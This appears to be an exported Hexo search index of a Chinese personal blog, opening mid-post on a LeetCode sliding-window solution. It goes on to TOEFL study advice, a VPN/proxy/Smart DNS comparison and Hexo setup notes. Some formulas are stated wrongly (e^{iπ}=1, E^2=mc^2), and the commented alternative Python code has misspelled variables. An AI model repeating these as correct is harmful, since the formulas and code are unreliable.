<p>$$O(\sum<em>{i=0}^{n-1}(\sum</em>{j=i+1}^n(j-i)))=O(\sum_{i=0}^{n-1} \frac{(1+n-i)(n-i)}{2})=O(n^3)$$</p>
<p>但是这种方法对于最后一个测试数据出现超时，所以必须用更有效的算法</p>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>后来在题解中看到这种方法叫Silding Window 滑动窗</p>
<p>从思路一的基础上我想到，每次找到一个[i,j)之间的substring之后，如果判断[i,j+1)不是一个substring，<em>在思路一中程序会把i+1，然后把 j=i+1</em>,然而其实[i,j)是已经判断好的substring，只是加上了一个str[j]之后不满足substring的条件了，即[i+1,j)也是一个substring，那么我们完全不必更新j的值，只需要继续从当前位置对j继续循环判断即可。</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度:"></a>时间复杂度:</h3><p>$$O(2*n)$$ 因为最坏情况下每个字符会被我们访问两次（by $i$ and $j$）</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        lenth=[]</span><br><span class="line">        <span class="keyword">if</span>(s.__len__()==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=i</span><br><span class="line">        substring=set()</span><br><span class="line">        <span class="keyword">while</span>(i&lt;s.__len__()<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">while</span>(j&lt;s.__len__()):</span><br><span class="line">                <span class="keyword">if</span> substring.__contains__(s[j]):</span><br><span class="line">                    lenth.append(substring.__len__())</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    substring.add(s[j])</span><br><span class="line">                    j=j+<span class="number">1</span></span><br><span class="line">            lenth.append(substring.__len__()) <span class="comment">#lenth中存放了以s[i]开头的最常substring 的长度       </span></span><br><span class="line">            substring.remove(s[i])<span class="comment">#每次都把头一个清除掉 然后接着往下数</span></span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> max(lenth)</span><br><span class="line">    <span class="comment">#更简单的写法：</span></span><br><span class="line">    <span class="comment">#while(i&lt;s.__len__()-1 and j&lt;s.__len__()-1):</span></span><br><span class="line">    <span class="comment">#	if not substring.__contains__(s[j]):</span></span><br><span class="line">    <span class="comment">#		subsring.add(s[j])</span></span><br><span class="line">    <span class="comment">#		j=j+1</span></span><br><span class="line">    <span class="comment">#		ans=max(ans,j-i)</span></span><br><span class="line">    <span class="comment">#	else:</span></span><br><span class="line">    <span class="comment">#		subtring.remove(s[i])</span></span><br><span class="line">    <span class="comment">#		i=i+1</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[托福备考心得]]></title>
      <url>/2017/04/08/%E6%89%98%E7%A6%8F%E5%A4%87%E8%80%83%E5%BF%83%E5%BE%97/</url>
      <content type="html"><![CDATA[<h2 id="托福备考总结"><a href="#托福备考总结" class="headerlink" title="托福备考总结"></a>托福备考总结</h2><p><strong>我的基础</strong></p>
<ol>
<li>开始准备托福是2016年9月，之前英语水平是6级533，去美国参加summer school 一个半月</li>
<li>因为是河南学生，高考英语不考听力和口语，所以这两项都比较弱</li>
</ol>
<p><strong>结果</strong></p>
<p>11.25日首考92分： 26 24 20 22</p>
<p>3.24日第二次考97分：27 22 24 24</p>
<p>*update 6.10第三次考103分：28 29 20 26</p>
<a id="more"></a>
<p>虽然还没有到100+，但是我自认为还是有一些”经验”可以说的，特别是对像我这样英语基础不是特别好的同学。下面就分不同学科来讲一下我备考的方法和一些感悟吧</p>
<h3 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h3><ol>
<li><strong>单词单词单词</strong>:自认为单词是阻碍我阅读拿高分的最大的障碍，如果文章中最主要的关键词或者有30%左右的单词都不认识，就算有再好的做题技巧也很难拿到高分。如果有意向出国的同学最好从大一大二就开始背单词，实际上我自己就不是一个很喜欢背单词的人，手机上背单词的APP装了很多，也试过背红宝书、自己拿本子记单词，也看过曲根老师的视频，但是都没能一直坚持下去。所以一直到第二次考试之前练TPO的时候也会错单词题。单词掌握得好另一个好处是遇到单词题你可以很快的选出来，这样可以节省出许多时间，而不必在某个单词题上纠结很久。</li>
<li><strong>做题速度</strong>：一定要计时练，从第一天复习TPO开始，我就一直用模考软件练习，虽然最开始20分钟内做不完一篇阅读题，最后一道5选3题很可能没有时间看，但是还是要计时做，到20分钟就停，看看自己能做到什么程度。没做完的题下来再看，这样考试的时候才能保证把题做完</li>
<li><strong>长难句</strong>：刚开始练托福的时候，经常碰到一句话里单词我都认识，但是却看不懂意思的情况，这是因为用了一些复杂的句式，后来我就把每篇阅读中遇到的比较难懂的句子摘抄下来有空看看，慢慢的再遇到比较长的句子的时候就能看出句子的结构，进而理解句子意思了</li>
<li><strong>复习资料</strong>：TPO, 如果你基础和我差不多的话，TPO完全够你用了，做完每套阅读一定要好好总结，总结每篇阅读中的生词、长难句，要充分利用TPO这个宝贵的资源。</li>
</ol>
<h3 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h3><p>实话说我第一次考完听力是觉得考的很好的（可能是因为遇到了经典加试把），虽然最后成绩并不是很理想。第二次3月25考或许是因为托福改革，没有遇到经典加试，听力很难，而且有很多多选题，考的是非常细节的内容，经常是五选三的题我只听出来了两个，所以还是只能猜一个了，做到后面心态有点乱了。但是我觉得备考过程中英语听力水平还是提高了不少的。</p>
<p>初期听力基础很弱的时候，我选择<strong>精听</strong>TPO的听力，做完之后一句一句听懂，我觉得也没有必要写下来吧，只要能复述出来就可以，写下来也比较费时间。这样精听虽然是很费时间的，但是确实非常有效。 后期大部分句子都能听明白的时候，重心就不再是把每句话听懂，而是要把意思能提炼出来了，所以后面我再静听的时候会一段一段听，听完之后想想这段讲的什么，如果大部分内容都能回忆起来这段就过了。</p>
<p><strong>笔记</strong>的话，我自己觉得像Conversation不是很有必要记笔记，一方面Con比较短，所以还是能记得住的，另一方面Conv语速非常快，我自己记笔记的时候，经常会漏掉正在说的信息，这样就有些得不偿失了。而且真心觉得，其实就算记了笔记，做题的时候也是凭记忆去选的，而不是看着笔记选的。所以记不记笔记还是看自己的情况啦。</p>
<p>后期我觉得听力遇到最大的问题就是<strong>注意力</strong>，一篇五分钟的Lecture，我往往听到三四分钟时候就要走神了，特别是遇到不是很熟悉的话题的时候，听不懂更容易走神.. 我自己也在努力解决这个问题。</p>
<p><strong>备考资料：</strong>TPO，精听，等到把TPO练完再去找其他材料吧。 另外平时可以看看CNN student news 练听力的同时可以看看新闻，比较轻松。</p>
<h3 id="口语"><a href="#口语" class="headerlink" title="口语"></a>口语</h3><p>口语似乎我就上了一个新东方的强化班，下来之后就没怎么练过了，每次考试之前会抽时间完整的练习一套。偶尔用奕欧英语说几篇1、2 题。第二次考试12题得了Good，觉得重要的还是回答的内容不在于有多深奥，要具体，比如说第二次考试口语第一题问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The university international office is going to hold a social event. Which one of the following choices do you think is the best?</span><br><span class="line"></span><br><span class="line">international food fair </span><br><span class="line">international music festival </span><br><span class="line">international film festival</span><br></pre></td></tr></table></figure>
<p>我印象特别深上新东方口语的时候第一次老师讲的就是你最喜欢吃的食物，火锅那个例子我都会背了。。于是就说了选择food fair，我最喜欢的是火锅，火锅多么好吃blabla~ 当时下来还以为有些跑题呢 哈哈，果然老外对于答案这种东西是比较随意的。后面3456题我每次都是fair 就不误导大家了。</p>
<h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p>第一次考试因为备考时间比较短，基本没有准备写作，考试时候综合写作信息漏掉很多，独立写作时间没把握好，最后没有留下时间检查语法错误。 第二次考试提前半个多月就开始每周保持至少联系三次写作吧，然后把写过的独立写作题目的思路专门记到了一个word里，准备了一个综合写作的模板。然而成绩只提高了2分诶…希望第三次考的时候能高一点</p>
<ol>
<li>综合写作：模板+听力。首先你要能把听力中的信息捕捉下来，要不会再多句式也没用。考试前准备了一个综合写作的模板，尽量在250字之内用更多的句式呗，虽然我觉得第二次考试我的综合写作信息捕捉的很好，写的应该也不错，但是却只是fair。分析了一下可能是因为</li>
<li>独立写作：第二次考试独立写作题目比较简单，我写了将近500字，（之前在知乎上看到有人说独立写作字数多容易得高分，就也有意识的想试试） 但是结果只比上次高了2分，看来单纯追求字数并不是很合理的，还是要在句式、词汇上多下功夫吧。文章结构我比较喜欢<em>开头+2理由+1让步+结论</em> ，比较实用吧。平时要积累一下可以加分的词汇，然后争取用在文章中，我的文章就是全文都是比较平凡的词，估计是Good也是Good 的最低分。</li>
</ol>
<hr>
<p>本来是想着第二次可以考上100 再写一篇心得的，但是第二次有些遗憾，第三次考试加油啦！</p>
]]></content>
      
        
        <tags>
            
            <tag> TOEFL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VPN vs. Proxy]]></title>
      <url>/2017/02/15/VPNvs.Proxy/</url>
      <content type="html"><![CDATA[<h2 id="VPN-vs-Proxy"><a href="#VPN-vs-Proxy" class="headerlink" title="VPN vs. Proxy"></a>VPN vs. Proxy</h2><p>大多数人都把VPN和Proxy当成一样的东西，实际上他们只是表现的功能一样了，本质功能并不相同。这篇文章分析了VPN和Proxy以及Smart DNS的区别。[原文链接]<a href="http://www.bestvpnanalysis.com/vpn-vs-proxy-vs-smart-dns/" target="_blank" rel="noopener">http://www.bestvpnanalysis.com/vpn-vs-proxy-vs-smart-dns/</a></p>
<a id="more"></a>
<h2 id="VPN-Virtual-Private-Network"><a href="#VPN-Virtual-Private-Network" class="headerlink" title="VPN Virtual Private Network"></a>VPN Virtual Private Network</h2><p>VPN是一个全面的privacy &amp; security工具，可以把你的地理位置（IP地址）移动到世界上所有区域包括受到访问限制的区域。VPN建立一个加密的私人隧道，使用Blowfish或AES128-bi或256bit加密协议，这个建立在你的PC和服务器之间的隧道用来传输数据并将你安全的连接到想到达的服务器上。 挑选VPN最重要的因素就是服务器要多，越多连接速度越快。</p>
<h3 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h3><ol>
<li>安全度高</li>
<li>允许用户选择VPN协议（protocol），例如PPTP L2TP SSTP等</li>
<li>VPN提供internet kill switch，在VPN链接慢时候会停止网络连接，帮助避免IPleaks</li>
</ol>
<h3 id="劣势："><a href="#劣势：" class="headerlink" title="劣势："></a>劣势：</h3><ol>
<li>速度慢</li>
<li>VPN连接有时候会挂掉，可能会导致原始身份original identity 泄露，未解决这个问题一些VPN提供了internet kill switch option</li>
</ol>
<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>Proxy server通常是你和Internet之间的一台电脑。当你访问一个网站时，这个网站的服务器会接收到一个来自Proxy server的IP地址的请求，而不是来自你的电脑的请求。所以如果这个代理服务器在境外，那就可以正常访问境外的网站了。代理服务器并不加密你的数据。通常代理服务器使用两种互联网通信协议Internet protocol for communication。 <strong>HTTP和SOCKS</strong></p>
<h3 id="HTTP-Proxy-Server"><a href="#HTTP-Proxy-Server" class="headerlink" title="HTTP Proxy Server"></a>HTTP Proxy Server</h3><p>HTTP代理服务器只能解析以Http://或者Https://开头的地址，所以他只对web browsing sessions有效，通过连接你和HTTP服务器来提供安全的web browsing sessions。所以他要比Socks proxy和VPN都快。通常是免费的。但是只对internet browsing有效，不是所有网站都能访问，在每个浏览器上都需要设置</p>
<h3 id="SOCKS-Proxy-Server"><a href="#SOCKS-Proxy-Server" class="headerlink" title="SOCKS Proxy Server"></a>SOCKS Proxy Server</h3><p>可以处理所有类型的网络数据流，比如IRCchat SMTP POP3for emails, torrent files，FTP. 而不仅仅是browsing sessions.但比HTTP要慢，而且任何想要在Socks Proxy上运行的软件都需要要单独配置</p>
<h2 id="Smart-DNS"><a href="#Smart-DNS" class="headerlink" title="Smart DNS"></a>Smart DNS</h2><p>smart DNS就是一个代理系统，用来解锁因为地区原因无法访问的网站。不需要任何第三方软件，只需要订阅smartDNS 服务，当用户连接上一个Smart DNS《，会被引导到世界各地的的proxy server，这样他们就可以访问想要访问的网站了。Smart DNS没有加密，所以比VPN要快</p>
<p>总结</p>
<table>
<thead>
<tr>
<th>VPN</th>
<th>Proxy</th>
<th>Smart DNS</th>
</tr>
</thead>
<tbody>
<tr>
<td>Provides Encryptions of AES 128bit or 256bit</td>
<td>No Encryption</td>
<td>No Encryption</td>
</tr>
<tr>
<td>Unblock Websites with complete privacy</td>
<td>Unblock websites with limited privacy</td>
<td>Unblock websites without privacy</td>
</tr>
<tr>
<td>Secure internet protocols are used OpenVPN, SSTP, etc.</td>
<td>Less secure protocols used like HTTP, Socks, etc.</td>
<td>No security</td>
</tr>
<tr>
<td>Safe to use on public Wifi</td>
<td>No protection on public Wifi</td>
<td>No protection on public Wifi</td>
</tr>
<tr>
<td>Can affect the connection speed a little due to encryption</td>
<td>The speed is slow even when no encryption, due to higher latency issues</td>
<td>Faster than VPN and proxy, but extremely prone to attacks</td>
</tr>
</tbody>
</table>
<p>总的来说三者实现的功能是相近的，都是帮助我们访问受地区限制的网站。VPN速度最慢，但是安全性最高，Proxy介于二者之间，部分加密，而smartDNS速度最快但是非常容易泄露信息。</p>
]]></content>
      
        
        <tags>
            
            <tag> Proxy </tag>
            
            <tag> VPN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mathjax-in-hexo]]></title>
      <url>/2017/01/27/mathjax-in-hexo/</url>
      <content type="html"><![CDATA[<h2 id="Hexo中的数学表达式"><a href="#Hexo中的数学表达式" class="headerlink" title="Hexo中的数学表达式"></a>Hexo中的数学表达式</h2><p>$e^{i\pi}=1$</p>
<a id="more"></a>
<p>经过网上的一番搜索大致得到以下几种方法</p>
<!--more-->
<ol>
<li><p>使用hexo-math插件</p>
<p>这个方法原本是很可行的，但是不知道怎么被我搞的只有其中一篇文章里面的公式可以正常显示，其他的文章都不可以了。</p>
</li>
<li><p>使用pandoc和hexo的插件 hexo-renderer-pandoc</p>
<p>但是这个方法github主页上的介绍太过简略，我尝试了很多次都无法正常显示公式，而且hexo server的时候也不报错，故放弃</p>
</li>
<li><p>使用hexo-renderer-kramed插件，这个渲染插件针对MathJax支持进行了改进</p>
<p>非常感谢 <a href="http://2wildkids.com/" target="_blank" rel="noopener">林肯先生</a> 的帮助~</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Intro-to-hexo]]></title>
      <url>/2017/01/25/intro-to-hexo/</url>
      <content type="html"><![CDATA[<h3 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h3><p>Hexo是一个简单的，轻量的，基于Node的一个静态博客框架，可以方便的生成静态网页。</p>
<p>A fast, simple &amp; powerfu blog framework, powered by Node.js</p>
<a id="more"></a>
<h3 id="Hexo的安装"><a href="#Hexo的安装" class="headerlink" title="Hexo的安装"></a>Hexo的安装</h3><ol>
<li>安装Git</li>
<li>安装Node.js 添加到系统路径</li>
<li>使用npm安装hexo<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Hexo命令"><a href="#Hexo命令" class="headerlink" title="Hexo命令"></a>Hexo命令</h3><ol>
<li>help:查看帮助信息</li>
<li>init [文件夹名字]:创建一个hexo项目，不指定文件夹名，则在当前目录创建</li>
<li><p>启动服务 在浏览器中方位<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建一篇文章 layout默认是post</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>
<p>发表的文章会全部显示，如果文章很长，就只要显示文章的摘要就行了。在需要显示摘要的地方添加如下代码即可<code>：&lt;!--more--&gt;</code></p>
</li>
</ol>
<h3 id="Hexo-demo下的目录与文件"><a href="#Hexo-demo下的目录与文件" class="headerlink" title="Hexo-demo下的目录与文件"></a>Hexo-demo下的目录与文件</h3><ul>
<li>scaffolds: 模板文件夹，默认三种布局 post page draft</li>
<li>source: 存放用户资源</li>
<li>themes:主题文件夹</li>
<li>_config.yml:全局的配置文件</li>
</ul>
<h3 id="发布到github"><a href="#发布到github" class="headerlink" title="发布到github"></a>发布到github</h3><ol>
<li>配置deplot指令</li>
<li><p>安装hexo-deployer-git包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git -S</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用hexo d指令发布到github</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Stay Hungry , Stay Foolish]]></title>
      <url>/2017/01/25/Foolish/</url>
      <content type="html"><![CDATA[<p>这是我的个人博客,一个并不聪明但是不断向前的IT小白</p>
<a id="more"></a>
<p>20岁是最好的年纪，保持一颗积极的心，Keep Moving</p>
<p>$E^2=mc^2$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hard_word</span><br><span class="line">print(<span class="string">"bright future"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/01/24/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
